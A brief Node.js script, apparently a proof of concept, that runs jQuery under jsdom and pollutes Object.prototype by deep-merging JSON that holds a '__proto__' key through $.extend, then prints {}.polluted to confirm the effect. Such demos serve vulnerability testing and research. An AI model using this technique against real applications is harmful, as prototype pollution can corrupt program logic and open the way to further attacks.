var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {JSDOM} = require('jsdom');
const {window} = new JSDOM('');
const $ = require('jquery')(window);
obj = {};
console.log({}.polluted);
$.extend(true, obj, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);